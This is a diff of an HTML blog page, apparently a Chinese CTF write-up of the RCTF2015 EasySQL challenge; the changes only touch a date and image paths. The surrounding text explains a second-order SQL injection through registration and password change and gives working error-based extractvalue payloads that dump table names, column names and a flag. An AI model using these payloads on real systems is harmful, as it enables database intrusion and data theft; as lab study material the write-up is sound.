@@ -584,7 +584,7 @@ You have an error in your SQL syntax; chec">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-18
+                    2022-01-28
                 </div>
                 
 
@@ -616,13 +616,13 @@ You have an error in your SQL syntax; chec">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152613750.png"></p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152622228.png"></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152613750.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152622228.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>关键词:[二次注入|先登后改|改密|正则]</p>
 <p>注册的时候有过滤</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152941359.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152941359.png"></p>
 <p>跑个fuzz试试，限制了这些字符：</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706160422510.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706160422510.png"></p>
 <p>注册个账号为<code>1&quot;</code></p>
 <p>改密码提示：</p>
 <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -631,26 +631,26 @@ You have an error in your SQL syntax; chec">
 <p>二次注入逻辑梳理：注册账户写入sql注入代码=&gt;修改密码触发sql注入代码</p>
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162112767.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162112767.png"></p>
 <h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4><p>flag不在flag表中，在users表中，注意，如果是burpsuite或hackbar发包，记得将&amp;&amp;转码</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162645199.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162645199.png"></p>
 <h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后……</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706164756534.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706164756534.png"></p>
 <p>要么把flag搜索出来，要么写脚本慢慢跑.</p>
 <h5 id="1-筛选"><a href="#1-筛选" class="headerlink" title="1.筛选"></a>1.筛选</h5><pre class="line-numbers language-none"><code class="language-none">#正序
 1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))))%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706171255380.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706171255380.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#逆序</span>
 <span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>reverse<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token operator">regexp</span><span class="token punctuation">(</span><span class="token string">'^f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706170925330.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706170925330.png"></p>
 <p>逆序输出下</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'dd286a765312-4e9b-bca4-fc93-77'</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
